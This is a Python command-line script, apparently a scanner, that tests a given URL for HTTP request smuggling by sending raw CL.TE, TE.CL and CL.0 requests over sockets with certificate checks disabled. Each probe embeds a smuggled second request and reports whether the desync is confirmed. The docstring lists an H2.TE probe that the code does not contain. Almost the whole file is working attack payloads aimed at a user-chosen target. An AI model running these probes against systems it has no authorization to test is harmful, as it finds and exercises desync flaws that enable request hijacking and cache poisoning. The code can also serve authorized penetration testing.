#!/usr/bin/env python3
"""HTTP Smuggling 自动探测 — CL.TE / TE.CL / CL.0 / H2.TE"""
import socket, ssl, time, sys, argparse

TIMEOUT = 5

def send_raw(host, port, use_tls, raw_bytes):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    s.connect((host, port))
    s.send(raw_bytes)
    try:
        resp = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
            if len(resp) > 65536:
                break
    except socket.timeout:
        pass
    s.close()
    return resp


def probe_cl_te(url):
    """前后端对Content-Length和Transfer-Encoding理解不一致"""
    from urllib.parse import urlparse
    p = urlparse(url)
    host = p.hostname
    port = p.port or (443 if p.scheme == "https" else 80)
    use_tls = p.scheme == "https"
    path = p.path or "/"

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"GPOST /404 HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
    ).encode()
    resp = send_raw(host, port, use_tls, req)
    text = resp.decode(errors="replace")
    if "404" in text and "GPOST" in text:
        return "🔴 CL.TE confirmed — frontend uses CL, backend uses TE (GPOST smuggled)"
    return "⚪ CL.TE negative"


def probe_te_cl(url):
    from urllib.parse import urlparse
    p = urlparse(url)
    host = p.hostname
    port = p.port or (443 if p.scheme == "https" else 80)
    use_tls = p.scheme == "https"
    path = p.path or "/"

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"5c\r\n"
        f"GPOST /404 HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode()
    resp = send_raw(host, port, use_tls, req)
    text = resp.decode(errors="replace")
    if "404" in text and "GPOST" in text:
        return "🔴 TE.CL confirmed — frontend uses TE, backend uses CL (GPOST smuggled)"
    return "⚪ TE.CL negative"


def probe_cl0(url):
    """CL.0 — backend ignores Content-Length = 0"""
    from urllib.parse import urlparse
    p = urlparse(url)
    host = p.hostname
    port = p.port or (443 if p.scheme == "https" else 80)
    use_tls = p.scheme == "https"
    path = p.path or "/"

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
        f"GET /404 HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
    ).encode()
    resp = send_raw(host, port, use_tls, req)
    text = resp.decode(errors="replace")
    if "404" in text:
        return "🔴 CL.0 suspected — backend may ignore zero CL"
    return "⚪ CL.0 negative"


def quick_scan(url):
    results = []
    results.append(probe_cl_te(url))
    results.append(probe_te_cl(url))
    results.append(probe_cl0(url))
    return results


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url", help="Target URL")
    p.add_argument("--probe", choices=["all","clte","tecl","cl0"], default="all")
    args = p.parse_args()

    probes = {"clte": probe_cl_te, "tecl": probe_te_cl, "cl0": probe_cl0}
    if args.probe == "all":
        for name, fn in probes.items():
            try:
                print(fn(args.url))
            except Exception as e:
                print(f"⚫ {name} error: {e}")
    else:
        try:
            print(probes[args.probe](args.url))
        except Exception as e:
            print(f"⚫ error: {e}")
